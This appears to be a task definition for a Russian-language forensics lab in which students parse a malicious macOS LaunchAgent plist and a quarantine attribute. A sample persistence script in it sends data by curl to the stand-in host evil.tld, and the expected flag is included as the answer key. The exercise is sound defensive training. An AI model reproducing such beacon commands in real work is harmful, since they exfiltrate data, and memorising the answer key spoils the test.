@@ -1,0 +1,67 @@
+{
+  "id": "forensics-macos-artifacts",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{m4c0s_p3rs1st3nc3_pl1st}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача: артефакты macOS\n\n`com.evil.updater.plist` — бинарный LaunchAgent, `quarantine.txt` — xattr.\n\n1. Разбери plist: `python3 macos_parse.py`.\n2. Найди и прочитай payload-скрипт из `ProgramArguments`: `cat evil/run.sh`.\n\nФлаг `nto{...}` — в теле скрипта. Запиши его в `found.txt`.\n"
+    },
+    {
+      "path": "/home/student/task/evil",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/com.evil.updater.plist",
+      "b64": "YnBsaXN0MDDVAQIDBAUGBwgKC1lLZWVwQWxpdmVVTGFiZWxfEBBQcm9ncmFtQXJndW1lbnRzWVJ1bkF0TG9hZF1TdGFydEludGVydmFsCF8QEGNvbS5ldmlsLnVwZGF0ZXKhCV8QHi9ob21lL3N0dWRlbnQvdGFzay9ldmlsL3J1bi5zaAkRDhAIEx0jNkBOT2JkhYYAAAAAAAABAQAAAAAAAAAMAAAAAAAAAAAAAAAAAAAAiQ=="
+    },
+    {
+      "path": "/home/student/task/quarantine.txt",
+      "text": "0083;5f8a1b2c;Safari;F0E5A1B2-C3D4-4E5F-9A0B-1C2D3E4F5A6B\n"
+    },
+    {
+      "path": "/home/student/task/evil/run.sh",
+      "text": "#!/bin/sh\n# persistence payload\ncurl -s http://evil.tld/beacon -d \"d=nto{m4c0s_p3rs1st3nc3_pl1st}\"\n"
+    },
+    {
+      "path": "/home/student/task/macos_parse.py",
+      "text": "#!/usr/bin/env python3\n# Parse a binary LaunchAgent plist and decode the quarantine xattr timestamp.\nimport plistlib, time\np = plistlib.load(open(\"com.evil.updater.plist\", \"rb\"))\nprint(\"Label          :\", p[\"Label\"])\nprint(\"ProgramArguments:\", p[\"ProgramArguments\"])\nprint(\"RunAtLoad      :\", p[\"RunAtLoad\"])\nq = open(\"quarantine.txt\").read().strip().split(\";\")\nprint(\"downloaded at  :\", time.strftime(\"%Y-%m-%d %H:%M:%S\", time.gmtime(int(q[1], 16))))\nprint(\"payload script :\", p[\"ProgramArguments\"][0])\n"
+    }
+  ],
+  "tools": {
+    "python3": {
+      "help": "python3 <скрипт.py> — интерпретатор Python (вывод захвачен из реального запуска)",
+      "cases": [
+        {
+          "match": "--version|^-V$",
+          "example": "python3 --version",
+          "output": "Python 3.12.4"
+        },
+        {
+          "match": "macos_parse\\.py",
+          "example": "python3 macos_parse.py",
+          "output": "Label          : com.evil.updater\nProgramArguments: ['/home/student/task/evil/run.sh']\nRunAtLoad      : True\ndownloaded at  : 2020-10-16 22:14:04\npayload script : /home/student/task/evil/run.sh\n"
+        }
+      ],
+      "fallback": "python3: доступно `python3 macos_parse.py`\n"
+    },
+    "plutil": {
+      "help": "plutil -p <файл.plist> — печать plist",
+      "cases": [
+        {
+          "match": "com\\.evil\\.updater\\.plist",
+          "example": "plutil -p com.evil.updater.plist",
+          "output": "{\n  \"KeepAlive\" => 0\n  \"Label\" => \"com.evil.updater\"\n  \"ProgramArguments\" => [\n    0 => \"/home/student/task/evil/run.sh\"\n  ]\n  \"RunAtLoad\" => 1\n  \"StartInterval\" => 3600\n}\n"
+        }
+      ]
+    }
+  }
+}
